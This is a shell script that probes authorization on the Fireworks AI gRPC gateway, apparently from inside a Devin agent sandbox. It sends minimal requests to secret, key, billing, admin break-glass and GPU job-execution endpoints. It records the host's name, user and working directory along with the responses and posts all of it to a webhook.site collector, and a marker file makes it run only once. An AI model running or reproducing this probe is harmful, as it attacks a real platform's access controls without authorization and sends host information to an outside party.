#!/bin/sh
# i86764: trusted-origin (Devin sandbox) vs platform-egress authorization differential.
# Read-only by construction: every frame is either empty or carries a single benign field
# (parent/name/account_id); no write bodies are ever submitted.
S="https://webhook.site/7069e327-e98a-475a-ac1b-5a94e9c12667/i86764-$(date +%s)-$(hostname 2>/dev/null)"
F="${TMPDIR:-/tmp}/.i86764.ran"
[ -f "$F" ] && { echo "[probe] I86764=skip"; exit 0; }
: > "$F" 2>/dev/null
d=$(mktemp -d "${TMPDIR:-/tmp}/.i86764.XXXXXX" 2>/dev/null) || d="${TMPDIR:-/tmp}/.i86764-$$"
mkdir -p "$d" 2>/dev/null || exit 0
o="$d/out"; : > "$o"
{
  echo "== I86764 META host=$(hostname 2>/dev/null) user=$(id -un 2>/dev/null) date=$(date -u +%FT%TZ 2>/dev/null) pwd=$(pwd 2>/dev/null)"
  echo "== CURL $(curl -V 2>/dev/null | head -1)"
} >> "$o"
one() {
  L="$1"; P="$2"; B64="$3"
  printf '%s' "$B64" | base64 -d > "$d/req" 2>/dev/null
  curl -sS --http2 --noproxy '*' -m 4 -D "$d/h" -o "$d/b" -X POST "https://gateway.fireworks.ai/$P" \
    -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @"$d/req" >/dev/null 2>&1
  HTTP=$(head -1 "$d/h" 2>/dev/null | awk '{print $2}')
  GS=$(grep -i '^grpc-status:' "$d/h" 2>/dev/null | tr -d '\r' | awk '{print $2}')
  GM=$(grep -i '^grpc-message:' "$d/h" 2>/dev/null | tr -d '\r' | sed 's/^grpc-message:[[:space:]]*//' | head -c 110 | tr -d '\n')
  BL=$(wc -c < "$d/b" 2>/dev/null | tr -d ' ')
  SH=$(sha256sum "$d/b" 2>/dev/null | cut -c1-16)
  HX=$(od -An -tx1 "$d/b" 2>/dev/null | tr -d ' \n' | head -c 160)
  echo "$L|$P|http=${HTTP:-none}|gs=${GS:-none}|gm=${GM:-none}|blen=${BL:-0}|sha16=${SH:-none}|hex=${HX:-none}" >> "$o"
  rm -f "$d/h" "$d/b" "$d/req" 2>/dev/null
  sleep 0.3
}
while IFS='|' read -r L P B64; do
  [ -z "$L" ] && continue
  one "$L" "$P" "$B64"
done <<'CELLS'
ctl-GetOAuthArguments-f1|gateway.Gateway/GetOAuthArguments|AAAAAAsKCXB5cm93b3Jrcw==
ValidateToken-empty|admingateway.AdminGateway/ValidateToken|AAAAAAA=
ValidateToken-f1|admingateway.AdminGateway/ValidateToken|AAAAABEKD3p6LWk4Njc2NC10b2tlbg==
GetSecret-empty|gateway.Gateway/GetSecret|AAAAAAA=
GetSecret-f1|gateway.Gateway/GetSecret|AAAAACYKJGFjY291bnRzL3B5cm93b3Jrcy9zZWNyZXRzL3p6LWk4Njc2NA==
ListProviderKeys-empty|gateway.Gateway/ListProviderKeys|AAAAAAA=
ListProviderKeys-f1|gateway.Gateway/ListProviderKeys|AAAAABQKEmFjY291bnRzL3B5cm93b3Jrcw==
GetDEKFor-empty|cmek.CMEK/GetDEKFor|AAAAAAA=
GetDEKFor-f1|cmek.CMEK/GetDEKFor|AAAAABQKEmFjY291bnRzL3B5cm93b3Jrcw==
GetAccount-f1|gateway.Gateway/GetAccount|AAAAABQKEmFjY291bnRzL3B5cm93b3Jrcw==
GetBalance-f1|gateway.Gateway/GetBalance|AAAAABQKEmFjY291bnRzL3B5cm93b3Jrcw==
AddCredits|admingateway.AdminGateway/AddCredits|AAAAAAA=
CreateCreditCode|admingateway.AdminGateway/CreateCreditCode|AAAAAAA=
GrantNexusPlan|admingateway.AdminGateway/GrantNexusPlan|AAAAAAA=
BreakGlassSupportAccessGrant|admingateway.AdminGateway/BreakGlassSupportAccessGrant|AAAAAAA=
UpdateAccount|gateway.Gateway/UpdateAccount|AAAAAAA=
CreateUser|gateway.Gateway/CreateUser|AAAAAAA=
UploadProviderKey|gateway.Gateway/UploadProviderKey|AAAAAAA=
CreateTrainingSession|gateway.Gateway/CreateTrainingSession|AAAAAAA=
ExecGpuDevJob|gpu_dev_jobs.GpuDevJobService/ExecGpuDevJob|AAAAAAA=
DownloadGpuDevJobFile|gpu_dev_jobs.GpuDevJobService/DownloadGpuDevJobFile|AAAAAAA=
CELLS
OK=0
curl -sS -m 25 --noproxy '*' -X POST -H 'content-type: text/plain' --data-binary @"$o" "$S" >/dev/null 2>&1 && OK=1
if [ "$OK" = 0 ]; then
  curl -sS -m 25 -X POST -H 'content-type: text/plain' --data-binary @"$o" "$S" >/dev/null 2>&1 && OK=1
fi
rm -f "$d/out" "$d/req" "$d/h" "$d/b" 2>/dev/null; rmdir "$d" 2>/dev/null
echo "[probe] I86764=posted ok=$OK"
exit 0
